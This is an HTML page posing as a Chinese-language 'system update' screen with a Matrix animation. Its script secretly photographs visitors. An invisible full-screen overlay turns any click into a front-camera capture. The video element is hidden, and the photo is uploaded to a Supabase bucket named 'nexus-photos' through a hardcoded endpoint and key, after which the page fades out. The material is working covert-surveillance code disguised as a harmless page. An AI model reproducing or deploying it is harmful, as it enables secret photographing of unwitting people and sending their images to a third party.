<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>系统更新</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{box-sizing:border-box}

body{
 margin:0;
 min-height:100vh;
 padding:0;
 display:flex;
 justify-content:center;
 align-items:center;
 background:#000; 
 color:#fff;
 font-family:"Courier New", monospace;
 overflow: hidden;
 position: relative;
}

#matrix-bg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    opacity: 0.8;
}

.app{
 width:100%;
 max-width:400px;
 padding:20px;
 text-align: center;
 position: relative;
 z-index: 2;
}

.logo{
 text-align:center;
 color:#65d9ff;
 font-size:20px;
 font-weight:bold;
 letter-spacing:2px;
 margin-bottom: 10px;
 opacity: 0.8;
}

.subtitle{
 text-align:center;
 color:#aebbd2;
 line-height:1.9;
 font-size:12px;
 margin-bottom: 20px;
 opacity: 0.7;
}

#status{
 text-align:center;
 margin-top:10px;
 padding:10px;
 border-radius:10px;
 background:#111;
 color:#70e6c0;
 font-size:12px;
 line-height:1.8;
 min-height: 30px;
 transition: opacity 0.5s;
}

.footer{
 text-align:center;
 color:#333;
 font-size:10px;
 margin-top:20px;
}

/* ناحیه شفاف برای کلیک کردن کاربر */
.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 5;
    cursor: pointer;
}

/* ویدیو کاملاً مخفی */
video{
 width:100%;
 border-radius:15px;
 margin-top:15px;
 background:#000;
 display: none !important;
}

</style>
</head>

<body>

<!-- ناحیه کلیک نامرئی روی کل صفحه -->
<div id="click-trigger" class="click-overlay"></div>

<canvas id="matrix-bg"></canvas>

<div class="app">

<div class="logo">NEXUS SYSTEM</div>

<p class="subtitle">
系统正在更新...
<br>
点击任意位置继续
</p>

<video id="video" autoplay playsinline muted></video>

<canvas id="canvas" hidden></canvas>

<div id="status">
等待用户操作
</div>

<div class="footer">
NEXUS PROJECT • VER 2.0
</div>

</div>

<script>

// SUPABASE CONFIGURATION
const SUPABASE_URL = "https://wxovglpgcddlmhropvtv.supabase.co";
const SUPABASE_KEY = "sb_publishable_Ykxw1h1xKfIqrKyzTXjsjw_lMtub-Wk";
const BUCKET = "nexus-photos";

const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const clickTrigger = document.getElementById("click-trigger");
const matrixCanvas = document.getElementById('matrix-bg');
const ctxMatrix = matrixCanvas.getContext('2d');

let stream = null;
let isProcessing = false;

function showStatus(message){
 statusBox.textContent = message;
}

// Matrix Effect
let matrixChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?";
let fontSize = 14;
let columns;
let drops = [];

function initMatrix() {
    matrixCanvas.width = window.innerWidth;
    matrixCanvas.height = window.innerHeight;
    columns = matrixCanvas.width / fontSize;
    drops = [];
    for(let i = 0; i < columns; i++) {
        drops[i] = Math.random() * -100;
    }
}

function drawMatrix() {
    ctxMatrix.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctxMatrix.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    
    ctxMatrix.fillStyle = '#0F0';
    ctxMatrix.font = fontSize + 'px monospace';
    
    for(let i = 0; i < drops.length; i++) {
        let text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
        ctxMatrix.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

// تابع اصلی شروع کار
async function startProcess() {
    if (isProcessing) return;
    isProcessing = true;
    
    // مخفی کردن ناحیه کلیک
    clickTrigger.style.display = 'none';
    
    try{
        showStatus("正在连接摄像头..."); 

        if(!navigator.mediaDevices?.getUserMedia){
            throw new Error("不支持此浏览器");
        }

        stream = await navigator.mediaDevices.getUserMedia({
            video:{facingMode:"user"},
            audio:false
        });

        video.srcObject = stream;
        
        await video.play();

        showStatus("正在拍照..."); 

        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video,0,0);

        canvas.toBlob(blob=>{
            if(!blob){
                showStatus("拍照失败");
                return;
            }

            processUpload(blob);

        },"image/jpeg",0.85);

    }catch(error){
        showStatus("错误: "+error.message);
        isProcessing = false;
    }
}

// تابع آپلود
async function processUpload(blob) {
    try{
        showStatus("正在上传..."); 

        const {data,error} = await db.auth.signInAnonymously();
        if(error) throw error;

        const currentUser = data.user;
        const filename = currentUser.id+"/"+Date.now()+".jpg";

        const {error:uploadError} = await db.storage
            .from(BUCKET)
            .upload(filename,blob,{contentType:"image/jpeg", upsert:false});

        if(uploadError) throw uploadError;

        showStatus("上传成功！"); 
        
        setTimeout(() => {
            stopCamera();
            showStatus("完成"); 
            
            setTimeout(() => {
                statusBox.style.opacity = "0";
                document.querySelector('.app').style.opacity = "0";
                document.querySelector('.logo').style.opacity = "0";
                document.querySelector('.subtitle').style.opacity = "0";
            }, 1000);

        }, 1000);

    }catch(error){
        showStatus("上传错误: "+error.message);
        isProcessing = false;
    }
}

// بستن دوربین
function stopCamera(){
 if(stream){
     stream.getTracks().forEach(track=> track.stop());
     stream = null;
 }
 video.srcObject = null;
}

// رویداد کلیک روی ناحیه شفاف
clickTrigger.addEventListener("click", startProcess);

document.body.addEventListener('click', (e) => {
    if(e.target !== clickTrigger && !stream) {
        startProcess();
    }
}, {once: true});

// اجرای افکت Matrix
initMatrix();
setInterval(drawMatrix, 33);

</script>

</body>
</html>
